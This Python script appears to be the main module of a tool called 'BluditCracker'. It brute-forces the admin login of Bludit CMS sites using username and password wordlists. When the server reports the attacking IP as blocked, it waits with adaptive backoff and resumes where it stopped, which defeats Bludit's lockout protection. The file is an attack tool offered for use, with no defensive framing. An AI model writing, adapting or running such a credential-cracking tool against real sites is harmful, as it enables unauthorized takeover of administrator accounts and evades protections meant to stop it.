#!/usr/bin/python3

import time

from bludit.httpclient import BluditHttpClient, IPAddressBlockedError
import bludit.credentials as credentials
from utils import loggers, argparsers

from pprint import pprint
import logging


class BluditCracker:
    def __init__(self):
        self.__bludit_credentials_factory__ = credentials.BluditCredentialsFactory()
        self.__bludit_http_client__ = BluditHttpClient(self.__bludit_credentials_factory__)
        self.last_credentials = None, None


    def __auto_adjust_sleep_time__(self, sleep_time_in_seconds, last_credentials_index):
        MIN_SLEEP_TIME_IN_SECONDS = 60
        if last_credentials_index == 0:
            sleep_time_in_seconds *= 2
        elif sleep_time_in_seconds > MIN_SLEEP_TIME_IN_SECONDS:
            sleep_time_in_seconds = max(sleep_time_in_seconds / 2, MIN_SLEEP_TIME_IN_SECONDS)
        return sleep_time_in_seconds

    def connect(self, admin_panel_url = '/admin/login'):
        self.__bludit_http_client__.connect(admin_panel_url)


    def find_credentials(self, credentials_dictionary):
        saved_username, saved_password = None, None
        self.last_credentials = None, None
        for username, password in credentials_dictionary:
            logging.getLogger().info('Trying {}:{}'.format(username, password))
            self.__bludit_http_client__.reconnect()
            self.last_credentials = username, password
            is_authenticated = self.__bludit_http_client__.try_authenticate(username = username, password = password)
            if is_authenticated:
                saved_username, saved_password = username, password
                break
        return saved_username, saved_password


    def find_credentials_with_bruteforce_bypass(self, credentials_dictionary, sleep_time_in_seconds=60):
        credentials = None
        searching = True
        while searching:
            try:
                credentials = self.find_credentials(credentials_dictionary)
                searching = False
            except IPAddressBlockedError:
                logging.getLogger().warning('IP address has been blocked')
            if searching:
                last_credentials_index = credentials_dictionary.index(self.last_credentials)
                credentials_dictionary = credentials_dictionary[last_credentials_index:]
                sleep_time_in_seconds = self.__auto_adjust_sleep_time__(sleep_time_in_seconds, last_credentials_index)
                logging.getLogger().info('Sleeping for {}s'.format(sleep_time_in_seconds))
                time.sleep(sleep_time_in_seconds)
        return credentials


def main():
    logger = loggers.create_logger()

    args_parser = argparsers.create_args_parser()
    script_args = args_parser.parse_args()

    usernames = credentials.load_usernames(script_args.U) if script_args.U else [script_args.u]
    passwords = credentials.load_usernames(script_args.P) if script_args.P else [script_args.p]

    credentials_dictionary = credentials.build_credentials_wordlist(usernames,passwords)

    admin_panel_url = ''.join([script_args.t, script_args.d])

    bludit_cracker = BluditCracker()
    bludit_cracker.connect(admin_panel_url)

    username, password = bludit_cracker.find_credentials_with_bruteforce_bypass( \
        credentials_dictionary, sleep_time_in_seconds=script_args.s)
    
    if username and password:
        logger.info('Credentials have been found => {}:{}'.format(username, password))
    else:
        logger.info('Credentials have not been found')


if __name__ == "__main__":
    main()

